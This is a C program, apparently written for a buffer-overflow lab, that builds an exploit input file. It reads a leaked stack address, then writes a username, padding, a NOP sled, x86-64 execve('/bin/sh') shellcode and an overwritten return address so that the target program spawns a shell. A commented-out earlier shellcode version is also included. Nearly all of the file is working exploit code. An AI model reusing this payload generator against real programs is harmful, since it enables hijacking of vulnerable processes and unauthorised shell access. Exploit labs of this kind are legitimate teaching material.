#include<stdio.h>

int main (void)
{
    FILE *fp_in,*fp_out;
    char str1[]="chaital";
	
    // char shellcode[] = "\xeb\x0e\x5f\x48\x31\xc0\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05"
		       // "\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\xef\xbe\xad";
	
	char exitcode[] = "\xeb\x18\x5f\x48\x31\xc0\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05"
		"\x48\x31\xc0\xb0\x60\x48\x31\xd2\x0f\x05\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e"
			"\x2f\x73\x68\x00\xef\xbe\xad\xde";
	
    char null = '\0';
    char NOP[] = "\x90"; 
    char str5[] = "sssssssssssssssssssssssssss";
    int i,j;
    unsigned long address;
	//read file written by mod_badbuf
    fp_in = fopen("pwAddr","r");
    if(fp_in != NULL)
    {
      fscanf(fp_in,"%lx",&address);
    }
           printf("\nthe address I got = %lx\n",address);
	  address = address + 0x28;
    unsigned char shellAddr[] = {(address >> 40) & 0xff,
		(address >> 32) & 0xff,(address >> 24) & 0xff,
		(address >> 16) & 0xff,(address >> 8) & 0xff,address & 0xff};
    fp_out=fopen("ipPart3", "w");

    if(fp_out!=NULL)
    {
		//name
       fprintf(fp_out,"%s\n",str1);
       
	   //pw, same as name 
       fprintf(fp_out,"%s%c",str1,null);
	   
	   //put a few NOPs till name is reached
       for(i=0;i<4;i++)
	 fprintf(fp_out,"%s",str5);
       fprintf(fp_out,"%s","ssssssssssss");
	   //put same name again
       fprintf(fp_out,"%s%c",str1,null);
	   
	   //put a few NOPs again
       for(i=0;i<7;i++){
	        for(j=0;j<1;j++)
	 fprintf(fp_out,"%c",NOP[j]);}
			
	   //shellcode
	   // for(i=0;i<32;i++)
		   // fprintf(fp_out,"%c",shellcode[i]);
	   
	   //exitcode, replacing shellcode
	   for(i=0;i<43;i++)
		   fprintf(fp_out,"%c",exitcode[i]);
	   
	   //put something till you reach return address of main
	   // for(i=0;i<2;i++) //commented
	     // fprintf(fp_out,"%s",str5); //commented
	   // fprintf(fp_out,"%s","ssssssssssssssssss"); //commented
	   
       // for(i=0;i<72;i++){
       for(i=0;i<62;i++){
	        for(j=0;j<1;j++)
	 fprintf(fp_out,"%c",NOP[j]);}
	   
	   // for(i=0;i<33;i++)
	 	for(i=0;i<32;i++)
	    fprintf(fp_out,"%c",null);
	   // fprintf(fp_out,"%s","sssssssssss");
	   //put the address right after name, from where you need the execution to start, so that
	   //whenever welcome is executed, shellcode will be executed and shell will spawn
	    for(i=5;i>=0;i--)
	      fprintf(fp_out,"%c",shellAddr[i]);
	   
	
      fclose(fp_out);
    }
    else
        printf("The file \"my_file\" couldn't be opened\n");

    return 0;
}